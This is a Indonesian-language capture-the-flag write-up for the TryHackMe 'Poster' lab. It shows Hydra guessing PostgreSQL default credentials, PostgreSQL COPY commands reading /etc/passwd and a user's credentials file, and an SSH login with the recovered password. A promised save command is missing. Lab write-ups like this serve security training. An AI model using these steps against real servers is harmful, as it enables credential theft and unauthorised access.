*** Writeup: TryHackMe - Poster Machine ***

Target IP: 10.48.165.15 (Sesuaikan jika IP berubah)
Difficulty: Easy
Objective: Get User & Root Flags
1. Reconnaissance (Scanning)
Melakukan scan port menggunakan Nmap untuk mencari layanan yang terbuka:
```bash
sudo nmap -sC -sV -p- 10.48.165.15
```
Gunakan kode dengan hati-hati.

Hasil:
Port 22: SSH
Port 80: HTTP (Landing Page "Poster CMS")
Port 5432: PostgreSQL Database (Terbuka & Vulnerable)
2. Database Exploitation
Mencoba menebak kredensial default PostgreSQL menggunakan Hydra:
```bash
hydra -l postgres -p password -s 5432 10.48.165.15 postgres
```
Gunakan kode dengan hati-hati.

Kredensial Ditemukan: postgres:password
Membaca File Sistem via Database
Login ke database dan gunakan fitur COPY untuk membaca file sensitif:
```bash
psql -h 10.48.165.15 -U postgres
```
# Masukkan password: password

# Mencari user sistem di /etc/passwd
CREATE TABLE temp(t text);
COPY temp FROM '/etc/passwd';
SELECT * FROM temp;
Gunakan kode dengan hati-hati.

Ditemukan petunjuk file: /home/dark/credentials.txt.
Menemukan Password User Dark
Baca file kredensial milik user dark:
```
sql
TRUNCATE temp;
COPY temp FROM '/home/dark/credentials.txt';
SELECT * FROM temp;
```
Gunakan kode dengan hati-hati.

Hasil: dark:qwerty1234#!hackme
3. Lateral Movement
Setelah mendapatkan kredensial, langkah selanjutnya dalam simulasi ini adalah mengakses sistem melalui SSH:
```bash
ssh dark@10.48.165.15
```
Gunakan kode dengan hati-hati.

Investigasi File Konfigurasi
Melakukan pemeriksaan pada direktori web untuk mencari informasi tambahan dalam file konfigurasi yang mungkin memiliki izin akses yang kurang aman:
```bash
cat /var/www/html/config.php
```
Gunakan kode dengan hati-hati.

4. Privilege Escalation
Langkah terakhir dalam dokumentasi ini adalah meningkatkan hak akses (privilege escalation). Dalam skenario mesin "Poster", hal ini melibatkan penggunaan identitas pengguna lain yang ditemukan untuk mengakses area sensitif atau mendapatkan akses administratif (root) melalui mekanisme yang tersedia di sistem target, seperti pengecekan izin sudo.
Kesimpulan Dokumentasi
Langkah-langkah di atas merangkum proses identifikasi kerentanan pada layanan PostgreSQL, ekstraksi data melalui perintah SQL, dan perpindahan akses antar pengguna di dalam sistem.
Dokumentasi ini dapat disimpan dengan perintah berikut di terminal:

Dokumentasi yang baik sangat membantu dalam memahami alur serangan dan menentukan langkah mitigasi yang tepat untuk menutup celah keamanan tersebut.
